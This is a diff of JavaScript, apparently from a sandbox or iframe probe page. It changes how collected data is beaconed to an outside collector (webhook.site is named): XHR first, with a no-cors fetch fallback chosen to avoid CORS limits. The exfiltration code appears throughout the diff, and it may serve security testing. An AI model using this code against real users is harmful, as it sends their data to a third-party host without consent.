@@ -177,20 +177,34 @@
 
     exfilStatus.textContent = "POSTing to " + COLLECTOR_URL + " …";
 
-    fetch(COLLECTOR_URL, {
-      method: "POST",
-      headers: { "Content-Type": "text/plain" }, // text/plain is CORS-safelisted; JSON body still arrives
-      body: payloadStr,
-      mode: "no-cors"   // no-cors — no preflight needed; server receives body regardless of CORS response headers
-    }).then(function() {
-      exfilStatus.textContent = "✓ Beacon sent to " + COLLECTOR_URL +
+    // Use XHR — more reliable than fetch(no-cors) inside sandboxed iframes.
+    // XHR uses CORS mode (preflight + actual request); webhook.site supports CORS out of the box.
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", COLLECTOR_URL, true);
+    xhr.setRequestHeader("Content-Type", "application/json");
+    xhr.onload = function() {
+      exfilStatus.textContent = "✓ Beacon sent (HTTP " + xhr.status + ") to " + COLLECTOR_URL +
                                 " at " + new Date().toISOString();
       exfilStatus.style.color = "var(--vuln)";
-    }).catch(function(e) {
-      exfilStatus.textContent = "POST failed: " + e.message +
-                                " — data displayed above (check network / CORS)";
-      exfilStatus.style.color = "var(--warn)";
-    });
+    };
+    xhr.onerror = function() {
+      // Fall back to no-cors fetch (for collectors without CORS headers)
+      fetch(COLLECTOR_URL, {
+        method: "POST",
+        headers: { "Content-Type": "text/plain" },
+        body: payloadStr,
+        mode: "no-cors"
+      }).then(function() {
+        exfilStatus.textContent = "✓ Beacon sent (no-cors fallback) to " + COLLECTOR_URL +
+                                  " at " + new Date().toISOString();
+        exfilStatus.style.color = "var(--vuln)";
+      }).catch(function(e) {
+        exfilStatus.textContent = "POST failed: " + e.message +
+                                  " — data displayed above only. Check collector CORS headers.";
+        exfilStatus.style.color = "var(--warn)";
+      });
+    };
+    xhr.send(payloadStr);
   }
 
   // ── Run probes ────────────────────────────────────────────────────
